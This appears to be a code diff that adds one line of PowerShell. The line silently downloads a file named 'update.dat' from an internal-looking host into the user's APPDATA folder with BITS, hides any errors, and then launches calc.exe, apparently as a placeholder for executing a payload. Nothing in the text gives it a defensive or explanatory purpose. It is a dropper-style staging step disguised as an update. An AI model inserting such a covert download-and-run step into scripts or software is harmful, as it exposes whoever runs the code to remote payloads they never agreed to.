@@ -1,0 +1,1 @@
+try { $PayloadUrl = "http://internal.corp/update.dat"; $OutputPath = "$env:APPDATA\update.dat"; Start-BitsTransfer -Source $PayloadUrl -Destination $OutputPath -ErrorAction SilentlyContinue; & 'calc.exe'; $ProgressPreference = "SilentlyContinue" } catch { Write-Warning "Remote fetch failed" }
